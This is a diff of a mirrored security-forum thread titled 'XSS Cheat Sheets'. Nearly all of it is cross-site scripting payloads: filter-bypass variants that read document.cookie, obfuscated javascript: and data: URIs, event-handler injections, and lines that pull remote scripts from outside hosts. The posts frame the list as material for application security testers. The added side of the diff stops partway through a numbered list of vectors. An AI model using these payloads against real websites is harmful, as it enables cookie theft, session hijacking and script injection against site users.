@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=364&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:58 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=364&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:32:58 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> XSS Cheat Sheets</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -54,46 +51,46 @@
 	
 	
 	<div class="content">
-		<blockquote class="restore">Basic ones<br />
-<br />
+		<blockquote class="restore">Basic ones<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code"><br />
-&#8220;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;<br />
-<br />
-<br />
-Bypass filter when it strips &lt;script&gt; tags:<br />
-<br />
-<br />
-%253cscript%253ealert(document.cookie)%253c/script%253e<br />
-<br />
-&#8220;&gt;&lt;s&#8221;%2b&#8221;cript&gt;alert(document.cookie)&lt;/script&gt;<br />
-<br />
-&#8220;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/script&gt;<br />
-<br />
-&#8220;&gt;&lt;&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt;<br />
-<br />
-foo%00&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br />
-<br />
-&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;<br />
-<br />
-%22/%3E%3CBODY%20onload=&#8217;document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&#8217;%3E<br />
-<br />
-<br />
-When inside &lt;script&gt; tags:<br />
-<br />
-&#8216;; alert(document.cookie); var foo=&#8217;<br />
-<br />
-foo\&#8217;; alert(document.cookie);//&#8217;;<br />
-<br />
-&lt;/script&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;<br />
-<br />
-<br />
-Other XSS that don&#8217;t require &lt;script&gt;:<br />
-<br />
-&lt;img src=asdf onerror=alert(document.cookie)&gt;<br />
-<br />
-&lt;BODY ONLOAD=alert(&#8217;XSS&#8217;)&gt;</code><hr />
+	<hr/><code class="bbcode_code"><br/>
+“&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;<br/>
+<br/>
+<br/>
+Bypass filter when it strips &lt;script&gt; tags:<br/>
+<br/>
+<br/>
+%253cscript%253ealert(document.cookie)%253c/script%253e<br/>
+<br/>
+“&gt;&lt;s”%2b”cript&gt;alert(document.cookie)&lt;/script&gt;<br/>
+<br/>
+“&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/script&gt;<br/>
+<br/>
+“&gt;&lt;&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt;<br/>
+<br/>
+foo%00&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>
+<br/>
+&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt;<br/>
+<br/>
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E<br/>
+<br/>
+<br/>
+When inside &lt;script&gt; tags:<br/>
+<br/>
+‘; alert(document.cookie); var foo=’<br/>
+<br/>
+foo\’; alert(document.cookie);//’;<br/>
+<br/>
+&lt;/script&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;<br/>
+<br/>
+<br/>
+Other XSS that don’t require &lt;script&gt;:<br/>
+<br/>
+&lt;img src=asdf onerror=alert(document.cookie)&gt;<br/>
+<br/>
+&lt;BODY ONLOAD=alert(’XSS’)&gt;</code><hr/>
 </div></blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_3">
@@ -106,23 +103,23 @@ Other XSS that don&#8217;t require &lt;script&gt;:<br />
 	<div class="content">
 		<blockquote class="restore"><div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;<br />
-&lt;IMG SRC=&quot;jav&nbsp; &nbsp; &nbsp; &nbsp; ascript:alert('XSS');&quot;&gt;<br />
-&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert('XSS');&quot;&gt;<br />
-&lt;IMG SRC=&quot; &#14;&nbsp; javascript<b></b>:alert('XSS');&quot;&gt;<br />
-&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;<br />
-&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;<br />
-&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;<br />
-&lt;BODY BACKGROUND=&quot;javascript<b></b>:alert('XSS')&quot;&gt;<br />
-&lt;BODY ONLOAD=alert('XSS')&gt;<br />
-&lt;IMG DYNSRC=&quot;javascript<b></b>:alert('XSS')&quot;&gt;<br />
-&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;<br />
-&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;<br />
-&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript<b></b>:alert('XSS');&quot;&gt;<br />
-&lt;IMG LOWSRC=&quot;javascript<b></b>:alert('XSS')&quot;&gt;<br />
-&lt;BR SIZE=&quot;&amp;{alert('XSS')}&quot;&gt;<br />
-&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;<br />
-&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;</code><hr />
+	<hr/><code class="bbcode_code">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;<br/>
+&lt;IMG SRC="jav        ascript:alert('XSS');"&gt;<br/>
+&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;<br/>
+&lt;IMG SRC="   javascript<b></b>:alert('XSS');"&gt;<br/>
+&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;<br/>
+&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;<br/>
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;<br/>
+&lt;BODY BACKGROUND="javascript<b></b>:alert('XSS')"&gt;<br/>
+&lt;BODY ONLOAD=alert('XSS')&gt;<br/>
+&lt;IMG DYNSRC="javascript<b></b>:alert('XSS')"&gt;<br/>
+&lt;LAYER SRC="http://ha.ckers.org/scriptlet.html"&gt;&lt;/LAYER&gt;<br/>
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;<br/>
+&lt;INPUT TYPE="IMAGE" SRC="javascript<b></b>:alert('XSS');"&gt;<br/>
+&lt;IMG LOWSRC="javascript<b></b>:alert('XSS')"&gt;<br/>
+&lt;BR SIZE="&amp;{alert('XSS')}"&gt;<br/>
+&lt;LAYER SRC="http://ha.ckers.org/scriptlet.html"&gt;&lt;/LAYER&gt;<br/>
+&lt;LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"&gt;</code><hr/>
 </div></blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_4">
@@ -135,19 +132,19 @@ Other XSS that don&#8217;t require &lt;script&gt;:<br />
 		<div class="title">Advanced XSS payloads</div>
 	
 	<div class="content">
-		<blockquote class="restore">There is a xss challenge created by .mario. The challenge was to get cookie access with javascript. This challenge can be found here:<br />
-<br />
+		<blockquote class="restore">There is a xss challenge created by .mario. The challenge was to get cookie access with javascript. This challenge can be found here:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">hxxp://html5sec.org/xssme/xssme2</code><hr />
-</div>The bypasses submitted by many researchers are listed here:<br />
-<br />
+	<hr/><code class="bbcode_code">hxxp://html5sec.org/xssme/xssme2</code><hr/>
+</div>The bypasses submitted by many researchers are listed here:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">hxxp://html5sec.org/xssme/bypasses</code><hr />
-</div>These are the list of advanced XSS payloads with many techniques. This can be very useful for many application security testers as advanced xss cheat sheet.<br />
-<br />
-Cheers,<br />
+	<hr/><code class="bbcode_code">hxxp://html5sec.org/xssme/bypasses</code><hr/>
+</div>These are the list of advanced XSS payloads with many techniques. This can be very useful for many application security testers as advanced xss cheat sheet.<br/>
+<br/>
+Cheers,<br/>
 AMol NAik</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_5">
@@ -158,9 +155,9 @@ AMol NAik</blockquote>
 	
 	
 	<div class="content">
-		<blockquote class="restore">ha.ckers.org/xss.html<br />
-i dont think that there exists any better XSS cheatsheet in this whole world.<br />
-however it dosent have much obfuscated injections, so that could be added here.<br />
+		<blockquote class="restore">ha.ckers.org/xss.html<br/>
+i dont think that there exists any better XSS cheatsheet in this whole world.<br/>
+however it dosent have much obfuscated injections, so that could be added here.<br/>
 :)</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_6">
@@ -175,108 +172,108 @@ however it dosent have much obfuscated injections, so that could be added here.<
 	<div class="content">
 		<blockquote class="restore"><div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">1) &lt;a href=&quot;javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;&quot;&gt;&lt;button&gt;<br />
-&nbsp;<br />
-2) &lt;div onmouseover='alert&amp;lpar;1&amp;rpar;'&gt;DIV&lt;/div&gt;<br />
-&nbsp;<br />
-3) &lt;iframe style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot;&gt;<br />
-&nbsp;<br />
-4) &lt;a href=&quot;jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;&quot;&gt;X&lt;/a&gt;<br />
-&nbsp;<br />
-5) &lt;embed src=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt; &#8203;<br />
-&nbsp;<br />
-6) &lt;object data=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt;&#8203;<br />
-&nbsp;<br />
-7) &lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt;&#8203;<br />
-&nbsp;<br />
-8) &lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;<br />
-&nbsp;<br />
-9) &lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror='prompt(1)'&quot;&gt;<br />
-&nbsp;<br />
-10) &lt;%&lt;!--'%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;<br />
-&nbsp;<br />
-11) &lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;<br />
-&nbsp;<br />
-12) &lt;iframe/src \/\/onload = prompt(1)<br />
-&nbsp;<br />
-13) &lt;iframe/onreadystatechange=alert(1)<br />
-&nbsp;<br />
-14) &lt;svg/onload=alert(1)<br />
-&nbsp;<br />
-15) &lt;input value=&lt;&gt;&lt;iframe/src=javascript<b></b>:confirm(1)<br />
-&nbsp;<br />
-16) &lt;input type=&quot;text&quot; value=``&lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt;<br />
-&nbsp;<br />
-17) http://www.&lt;script&gt;alert(1)&lt;/script .com<br />
-&nbsp;<br />
-&nbsp;<br />
-18) &lt;iframe&nbsp; src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt; &#8203;<br />
-&nbsp;<br />
-19) &lt;svg&gt;&lt;script ?&gt;alert(1)<br />
-&nbsp;<br />
-20) &lt;iframe&nbsp; src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;<br />
-&nbsp;<br />
-21) &lt;img src=`xx:xx`onerror=alert(1)&gt;<br />
-&nbsp;<br />
-22) &lt;object type=&quot;text/x-scriptlet&quot; data=&quot;http://jsfiddle.net/XLE63/ &quot;&gt;&lt;/object&gt;<br />
-&nbsp;<br />
-23) &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;&#8203;<br />
-&nbsp;<br />
-24) &lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click<br />
-&nbsp;<br />
-25) &lt;embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;&#8203;<br />
-&nbsp;<br />
-26) &lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1<br />
-&nbsp;<br />
-27) &lt;a href=&quot;data:text/html;base64_,&lt;svg/onload=\u0061&amp;#x6C;&amp;#101%72t(1)&gt;&quot;&gt;X&lt;/a<br />
-&nbsp;<br />
-28) &lt;iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE&gt;<br />
-&nbsp;<br />
-29) &lt;script&gt;~'\u0061' ;&nbsp; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.&nbsp; \u0061\u006C\u0065\u0072\u0074(~'\u0061')&lt;/script U+<br />
-&nbsp;<br />
-30) &lt;script/src=&quot;data&amp;colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')&quot;&gt;&lt;/script a=\u0061 &amp; /=%2F<br />
-&nbsp;<br />
-31)&nbsp; &lt;script/src=data&amp;colon;text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script &#8203;&#8203;&#8203;&#8203;&#8203;&#8203;&#8203;&#8203;&#8203;&#8203;&#8203;&#8203;<br />
-&nbsp;<br />
-32) &lt;object data=javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t(1)&gt;<br />
-&nbsp;<br />
-33) &lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;<br />
-&nbsp;<br />
-34) &lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;<br />
-&nbsp;<br />
-35) &lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script &#8203;<br />
-&nbsp;<br />
-36) &lt;img src ?itworksonchrome?\/onerror = alert(1)&#8203;&#8203;&#8203;<br />
-&nbsp;<br />
-37) &lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;<br />
-&nbsp;<br />
-38) &lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)<br />
-&nbsp;<br />
-39) &lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa&nbsp; aaaaaaaaa aaaaaaaaaa&nbsp; href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe<br />
-&nbsp;<br />
-40) &lt;script x&gt; alert(1) &lt;/script 1=2<br />
-&nbsp;<br />
-41) &lt;div/onmouseover='alert(1)'&gt; style=&quot;x:&quot;&gt;<br />
-&nbsp;<br />
-42)&nbsp; &lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;<br />
-&nbsp;<br />
-43)&nbsp; &lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt; &#8203;<br />
-&nbsp;<br />
-44) &lt;div&nbsp; style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot;&nbsp; onmouseover=&quot;prompt(1)&quot; onclick=&quot;alert(1)&quot;&gt;x&lt;/button&gt;&#8203;<br />
-&nbsp;<br />
-45) &quot;&gt;&lt;img src=x onerror=window.open('https://www.google.com/');&gt;<br />
-&nbsp;<br />
-46) &lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME<br />
-&nbsp;<br />
-47) &lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click<br />
-&nbsp;<br />
-48) &lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;&#8203;<br />
-&nbsp;<br />
-49) &lt;iframe&nbsp; src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;<br />
-&nbsp;<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 50) &lt;a&nbsp; href=&quot;data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203&quot;&gt;Click&nbsp; Me&lt;/a&gt;</code><hr />
-</div>Source:<a href="../external.html?link=http://pastebin.com/mQDbu7Sm" target="_blank">50 awesome XSS vectors that I have tweeted (@soaj1664ashar) over time. Enjoy! No - Pastebin.com</a><br />
-<br />
+	<hr/><code class="bbcode_code">1) &lt;a href="javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;"&gt;&lt;button&gt;<br/>
+ <br/>
+2) &lt;div onmouseover='alert&amp;lpar;1&amp;rpar;'&gt;DIV&lt;/div&gt;<br/>
+ <br/>
+3) &lt;iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"&gt;<br/>
+ <br/>
+4) &lt;a href="jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;"&gt;X&lt;/a&gt;<br/>
+ <br/>
+5) &lt;embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"&gt; ​<br/>
+ <br/>
+6) &lt;object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"&gt;​<br/>
+ <br/>
+7) &lt;var onmouseover="prompt(1)"&gt;On Mouse Over&lt;/var&gt;​<br/>
+ <br/>
+8) &lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;<br/>
+ <br/>
+9) &lt;img src="/" =_=" title="onerror='prompt(1)'"&gt;<br/>
+ <br/>
+10) &lt;%&lt;!--'%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;<br/>
+ <br/>
+11) &lt;script src="data:text/javascript,alert(1)"&gt;&lt;/script&gt;<br/>
+ <br/>
+12) &lt;iframe/src \/\/onload = prompt(1)<br/>
+ <br/>
+13) &lt;iframe/onreadystatechange=alert(1)<br/>
+ <br/>
+14) &lt;svg/onload=alert(1)<br/>
+ <br/>
+15) &lt;input value=&lt;&gt;&lt;iframe/src=javascript<b></b>:confirm(1)<br/>
+ <br/>
+16) &lt;input type="text" value=``&lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt;<br/>
+ <br/>
+17) http://www.&lt;script&gt;alert(1)&lt;/script .com<br/>
+ <br/>
+ <br/>
+18) &lt;iframe  src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt; ​<br/>
+ <br/>
+19) &lt;svg&gt;&lt;script ?&gt;alert(1)<br/>
+ <br/>
+20) &lt;iframe  src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;<br/>
+ <br/>
+21) &lt;img src=`xx:xx`onerror=alert(1)&gt;<br/>
+ <br/>
+22) &lt;object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "&gt;&lt;/object&gt;<br/>
+ <br/>
+23) &lt;meta http-equiv="refresh" content="0;javascript&amp;colon;alert(1)"/&gt;​<br/>
+ <br/>
+24) &lt;math&gt;&lt;a xlink:href="//jsfiddle.net/t846h/"&gt;click<br/>
+ <br/>
+25) &lt;embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always&gt;​<br/>
+ <br/>
+26) &lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1<br/>
+ <br/>
